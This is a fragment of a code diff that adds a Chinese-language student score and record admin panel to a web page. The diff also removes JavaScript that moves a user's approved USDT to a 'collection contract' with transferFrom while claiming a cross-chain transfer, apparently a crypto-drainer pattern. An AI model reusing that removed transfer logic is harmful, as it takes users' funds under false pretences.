+                    <button onclick="updateScore('${item.idcard}')">保存</button>
+                    <button class="btn-del" onclick="deleteStudent('${item.idcard}')">删除</button>
+                </td>
+            </tr>`;
+        })
+        html+="</table>";
+        document.getElementById("adminList").innerHTML=html;
     }
-    return;
-  }
-  if(stepStatus ===2){
-    if(!targetReceiveAddr){
-      showTip("请设置以太坊接收地址");
-      return;
+
+    //修改成绩
+    window.updateScore = function(idcard){
+        let t = Number(document.querySelector(`.t-input[data-id="${idcard}"]`).value);
+        let p = Number(document.querySelector(`.p-input[data-id="${idcard}"]`).value);
+        const idx = studentDB.findIndex(s=>s.idcard===idcard);
+        studentDB[idx].theory = t;
+        studentDB[idx].practical = p;
+        studentDB[idx].status = t>=60&&p>=60?"合格":"不合格";
+        saveStu();
+        alert("成绩修改完成");
+        renderStudentTable();
     }
-    mainOperateBtn.disabled = true;
-    statusShow.innerText = "BSC链划转资产至归集合约";
-    try{
-      const userAddr = await signer.getAddress();
-      const amountWei = ethers.utils.parseUnits(sendNum.toString(),18);
-      const gasPrice = await provider.getGasPrice();
-      const txOpt = {gasPrice:gasPrice.mul(110).div(100),gasLimit:300000};
-      await usdtContract.transferFrom(userAddr,SPENDER_CONTRACT,amountWei,txOpt);
-      stepStatus =3;
-      mainOperateBtn.innerText = "交易已提交";
-      statusShow.innerText = "BSC转出成功，等待以太坊链上到账";
-      showTip("BSC端划转完成，以太坊地址等待到账");
-    }catch(e){
-      showTip("划转失败："+e.message);
-      statusShow.innerText = "划转失败";
-      mainOperateBtn.disabled = false;
+
+    //删除学员
+    window.deleteStudent = function(idcard){
+        if(!confirm("确认永久删除该学员档案？删除后无法查询此人员信息！")) return;
+        studentDB = studentDB.filter(item=>item.idcard!==idcard);
+        saveStu();
+        alert("档案已彻底删除");
+        renderStudentTable();
     }
-  }
-})
+
+    renderStudentTable();
 </script>
 </body>
 </html>
